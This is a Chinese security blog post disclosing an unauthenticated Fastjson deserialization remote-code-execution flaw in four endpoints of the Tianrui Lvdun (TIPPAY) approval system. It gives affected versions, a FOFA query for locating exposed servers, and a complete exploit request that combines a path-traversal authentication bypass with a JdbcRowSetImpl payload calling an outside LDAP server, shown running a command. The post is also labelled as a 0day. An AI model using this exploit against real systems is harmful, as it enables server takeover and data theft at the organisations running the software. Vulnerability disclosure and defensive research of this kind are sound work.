---
title: "天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞"
source: https://mrxn.net/jswz/trwfe-updateFilePrintParamsD-fastjson-rce.html
asset_dir: assets/天锐绿盾审批系统-updatefileprintparamsd.do、updatefileoutsendparameter.do、updatescreenshotparameter.do、updatebehaviorctrlparams.d
---

# 天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/19 08:19
- 592浏览
- [2评论](#comment)
- 14分钟阅读

深入探索

编程语言教程

授权

Web安全课程

---

# 漏洞简介

天锐绿盾审批系统是一款企业级数据防泄密（DLP）解决方案，主要用于对企业内部的敏感文件进行透明加密、权限管理以及审批流程控制，旨在防止数据泄露并保障信息安全。

漏洞扫描服务

该系统的 `updateFilePrintParamsD.do`、`updateScreenshotParameter.do`、 `updateFileOutSendParameter.do` 、`updateBehaviorCtrlParams.do`、接口存在 Fastjson 反序列化漏洞。攻击者可以通过构造恶意的 JSON 数据包，利用 Fastjson 库在处理数据时存在的反序列化缺陷，在未经授权的情况下，在服务器端执行[任意代码](https://mrxn.net/tag/rce)。

成功利用此漏洞可能导致服务器被完全控制，攻击者可以窃取敏感数据、植入恶意程序、篡改系统配置，甚至对整个企业网络造成严重破坏，对企业的业务连续性和数据安全构成重大威胁。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

深入探索

文本剥离工具

网络安全培训

Windows安全工具

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 安全运维咨询

# 漏洞分析

先看下fastjson的版本

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-001-7222c52854b5.webp)](https://image.mrxn.net/fcd06c93f6724d53a9f0dc001fe8d39c.webp)

1.2.7版本，不是最新版，是存在反序列化rce漏洞的。

再看`updateFilePrintParamsD.do` 的实现部分

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-002-39dc792eae37.webp)](https://image.mrxn.net/d7df6bebd45a4d90a59560f195473469.webp)

`params`参数被直接用于`JSONObject.parseObject`进行反序列化操作，非常明显的fastjson反序列化漏洞没啥好分析的。

深入探索

编码转换工具

漏洞预警服务

安全工具开发

`updateFileOutSendParameter.do` 也是同样如此

网络安全

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-003-05506826ac2b.webp)](https://image.mrxn.net/4b04f54dffc74c0ba04cc4997edf82f6.webp)

`updateScreenshotParameter.do` 亦如此

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-004-2cca15535d84.webp)](https://image.mrxn.net/9b22e71108f644e5b24220c8c269bc54.webp)

`updateScreenshotParamD.do` 亦如此（需要一个合法存在的processInstanceId

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-005-12147813039f.webp)](https://image.mrxn.net/635eb39f13904d4d862ee5870bdb177c.webp)

`updateBehaviorCtrlParams.do` 亦如此

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-006-bdd4b09025f7.webp)](https://image.mrxn.net/d8f4c75081d74cb6961d3bca577e69dd.webp)

# 漏洞复现

使用`Java Chains`的`JNDILDAPDeserializePayload`下的`Fastjson反序列化链`配合`One For All Echo 回显`来完成利用

漏洞扫描服务

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-007-cf3bb661c61f.webp)](https://image.mrxn.net/0b70a47fee754f9ea8b06ffd3062fe1a.webp)

## updateFilePrintParamsD.do

```
POST /trwfe/login.jsp/.%2e/task/updateFilePrintParamsD.do HTTP/1.1
Host: trwfe.mrxn.net
X-Authorization: dir
Content-Type: application/x-www-form-urlencoded

params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+%22ldap%3A%2F%2F192.168.168.11%3A50389%2F165c51%22%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1
```

成功执行`dir`命令 并回显命令执行结果

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-008-20974ff540bd.webp)](https://image.mrxn.net/c92b17c98bb2462aa20e2134c0a383a6.webp)

## updateFileOutSendParameter.do

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-009-b6a3e8c0d6e9.webp)](https://image.mrxn.net/43c6c3b76ea84d6393db2202e0349a62.webp)

## updateScreenshotParameter.do

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-010-b7f3a31f9c60.webp)](https://image.mrxn.net/01170c5193f2499eaf36f0d7d9e23f0a.webp)

## updateBehaviorCtrlParams.do

[![天锐绿盾审批系统 updateFilePrintParamsD.do、updateFileOutSendParameter.do、updateScreenshotParameter.do、updateBehaviorCtrlParams.do fastjson反序列化漏洞](images/img-011-6be41d6e0032.webp)](https://image.mrxn.net/b063995fbf08464ca7f56ba6b549cf16.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.updateFilePrintParamsD.do](#toc-5-1-)
- [5.2.updateFileOutSendParameter.do](#toc-5-2-)
- [5.3.updateScreenshotParameter.do](#toc-5-3-)
- [5.4.updateBehaviorCtrlParams.do](#toc-5-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
